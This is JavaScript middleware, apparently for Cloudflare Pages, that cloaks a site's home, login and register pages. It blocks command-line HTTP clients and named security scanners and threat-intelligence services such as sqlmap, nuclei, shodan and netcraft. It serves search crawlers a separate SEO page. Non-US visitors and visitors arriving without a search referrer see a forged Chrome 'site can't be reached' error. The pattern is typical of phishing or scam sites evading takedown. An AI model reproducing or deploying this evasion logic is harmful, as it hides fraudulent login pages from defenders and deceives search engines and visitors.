var GATED_PATHS = {
  '/': true,
  '/index': true,
  '/index.html': true,
  '/login': true,
  '/login.html': true,
  '/register': true,
  '/register.html': true,
};

var SECURITY_HEADERS = {
  'X-Robots-Tag': 'noai, noimageai',
  'X-Frame-Options': 'DENY',
  'X-Content-Type-Options': 'nosniff',
  'Referrer-Policy': 'strict-origin-when-cross-origin',
};

var BLOCKED_TOOL_UAS = /curl|wget|python-requests|python-urllib|httpie|axios|node-fetch|got\/|undici|okhttp|libwww-perl|go-http-client|java\/|php\/|ruby|scrapy|httpclient|winhttp|postman|insomnia|restsharp|apache-httpclient/i;

var BLOCKED_SCANNER_UAS = /nuclei|sqlmap|nikto|nessus|openvas|masscan|zgrab|nmap|wpscan|dirbuster|gobuster|ffuf|httpx|katana|burpsuite|acunetix|qualys|rapid7|shodan|censys|zoomeye|binaryedge|whatweb|w3af|arachni|skipfish|feroxbuster|dirsearch|semrushbot|ahrefsbot|ahrefssiteaudit|mj12bot|dotbot|rogerbot|megaindex|blexbot|netcraft/i;

var TRUSTED_CRAWLERS = /googlebot|google-inspectiontool|google-site-verification|google-structured-data-testing-tool|googleother|apis-google|feedfetcher-google|mediapartners-google|adsbot-google|storebot-google|bingbot|bingpreview|msnbot|msnbot-media|slurp|yahoo|duckduckbot|baiduspider|yandexbot|applebot|facebookexternalhit|facebookcatalog|twitterbot|linkedinbot|pinterestbot|slackbot|discordbot|whatsapp|telegrambot|skypeuripreview/i;

var SEARCH_REFERRERS = /google\.|bing\.|yahoo\.|duckduckgo\.|baidu\.|yandex\.|ecosia\.|startpage\.|ask\.|aol\.|search\./i;

function addHeaders(response) {
  var resp = new Response(response.body, response);
  for (var key in SECURITY_HEADERS) {
    resp.headers.set(key, SECURITY_HEADERS[key]);
  }
  return resp;
}

function buildErrorPage(hostname) {
  return '<!DOCTYPE html><html lang="en"><head><meta charset="utf-8"><meta name="viewport" content="width=device-width,initial-scale=1"><title>' + hostname + '</title><style>*{box-sizing:border-box;margin:0;padding:0}body{font-family:-apple-system,BlinkMacSystemFont,"Segoe UI",Roboto,Helvetica,Arial,sans-serif;background:#fff;color:#202124;-webkit-font-smoothing:antialiased}.e-wrap{display:flex;flex-direction:column;align-items:center;justify-content:center;min-height:100vh;padding:24px 16px;text-align:center}.e-icon svg{width:72px;height:72px;margin-bottom:24px}h1{font-size:20px;font-weight:400;color:#202124;margin-bottom:6px}.e-sub{font-size:14px;color:#5f6368;margin-bottom:20px;line-height:1.5}.e-sub strong{color:#202124;font-weight:500}.e-details{font-size:13px;color:#5f6368;text-align:left;max-width:400px;line-height:1.7;margin-bottom:20px}.e-details ul{margin:4px 0 0 20px}.e-code{font-size:12px;color:#5f6368;margin-bottom:24px}.e-btn{display:inline-block;padding:8px 24px;background:#1a73e8;color:#fff;border:none;border-radius:4px;font-size:14px;cursor:pointer;text-decoration:none}.e-btn:hover{background:#1765cc}@media(prefers-color-scheme:dark){body{background:#202124;color:#e8eaed}h1{color:#e8eaed}.e-sub{color:#9aa0a6}.e-sub strong{color:#e8eaed}.e-details{color:#9aa0a6}.e-code{color:#9aa0a6}}</style></head><body><div class="e-wrap"><div class="e-icon"><svg viewBox="0 0 72 72" fill="none"><circle cx="36" cy="36" r="34" stroke="#dadce0" stroke-width="2.5"/><path d="M36 22v20" stroke="#dadce0" stroke-width="3" stroke-linecap="round"/><circle cx="36" cy="50" r="2" fill="#dadce0"/></svg></div><h1>This site can’t be reached</h1><p class="e-sub"><strong>' + hostname + '</strong>’s server IP address could not be found.</p><div class="e-details"><p>Try:</p><ul><li>Checking the connection</li><li>Checking the proxy and the firewall</li><li>Running Windows Network Diagnostics</li></ul></div><p class="e-code">ERR_NAME_NOT_RESOLVED</p><a class="e-btn" href="javascript:location.reload()">Reload</a></div></body></html>';
}

export async function onRequest(context) {
  var request = context.request;
  var env = context.env;
  var next = context.next;
  var url = new URL(request.url);
  var pathname = url.pathname;
  var ua = request.headers.get('user-agent') || '';

  if (BLOCKED_TOOL_UAS.test(ua) || BLOCKED_SCANNER_UAS.test(ua)) {
    return new Response(null, { status: 403 });
  }

  if (GATED_PATHS[pathname]) {
    var referer = request.headers.get('referer') || '';
    var host = request.headers.get('host') || '';
    var country = (request.cf && request.cf.country) || '';

    var isTrustedCrawler = TRUSTED_CRAWLERS.test(ua);
    var isFromSearch = SEARCH_REFERRERS.test(referer);
    var isInternal = host && referer.indexOf(host) !== -1;

    if (isTrustedCrawler) {
      try {
        var seoUrl = new URL('/seo.html', request.url);
        var seoResp = await env.ASSETS.fetch(seoUrl);
        if (seoResp.ok) {
          return addHeaders(new Response(seoResp.body, {
            status: 200,
            headers: { 'Content-Type': 'text/html; charset=utf-8' },
          }));
        }
      } catch (e) {}
    }

    var referrerGateOn = String(env.GATE_REFERRER || 'on').toLowerCase() !== 'off';

    if (!isTrustedCrawler) {
      if (country && country !== 'US') {
        return new Response(buildErrorPage(url.hostname), {
          status: 200,
          headers: { 'Content-Type': 'text/html; charset=utf-8' },
        });
      }
      if (referrerGateOn && !isFromSearch && !isInternal) {
        return new Response(buildErrorPage(url.hostname), {
          status: 200,
          headers: { 'Content-Type': 'text/html; charset=utf-8' },
        });
      }
    }
  }

  var response = await next();
  return addHeaders(response);
}
